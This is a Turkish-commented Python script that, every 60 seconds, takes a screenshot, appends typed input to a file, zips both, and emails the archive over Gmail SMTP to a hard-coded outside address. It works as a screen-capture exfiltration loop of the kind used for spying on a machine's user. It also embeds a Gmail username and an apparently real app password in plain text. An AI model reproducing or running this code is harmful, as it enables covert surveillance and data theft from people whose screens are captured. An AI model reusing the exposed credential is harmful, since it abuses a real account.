import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import time
import pyautogui
import zipfile

# ... (diğer değişkenler ve ayarlar)
GMAIL_USERNAME = "saffetcan5665@gmail.com"
GMAIL_PASSWORD = "mtnldxzupeumigqp"
DATA_FILE = "veriler.txt"
SCREENSHOT_FILE = "screenshot.png"
TO_EMAIL = "saffetdmr7@gmail.com"

# 60 saniyede bir çalışacak döngü
while True:
    
    # Ekran görüntüsü al
    screenshot = pyautogui.screenshot()
    
    screenshot.save(SCREENSHOT_FILE)

    # Kullanıcıdan veri al
    veri = input("Lütfen kaydedilecek veriyi girin: ")

    # Veriyi dosyaya kaydet
    with open(DATA_FILE, "a") as file:
        file.write(veri + "\n")

    # Zip dosyası oluştur
    with zipfile.ZipFile('veri.zip','w') as zipf:
        zipf.write(SCREENSHOT_FILE)
        zipf.write(DATA_FILE)

    # E-posta gönder
    msg = MIMEMultipart()
    msg['From'] = GMAIL_USERNAME
    msg['To'] = TO_EMAIL
    msg['Subject'] = "Yeni veri ve ekran görüntüsü"

    text = MIMEText("Yeni veri ve ekran görüntüsü ekte bulunmaktadır.")
    msg.attach(text)

    with open('veri.zip', "rb") as file:
        data = MIMEApplication(file.read(), Name="veri.zip")
    data['Content-Disposition'] = 'attachment; filename="veri.zip"'
    msg.attach(data)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(GMAIL_USERNAME, GMAIL_PASSWORD)
    server.sendmail(GMAIL_USERNAME, TO_EMAIL, msg.as_string())
    server.quit()

    print("Veri ve ekran görüntüsü gönderildi!")

    # 60 saniye bekle
    time.sleep(60)
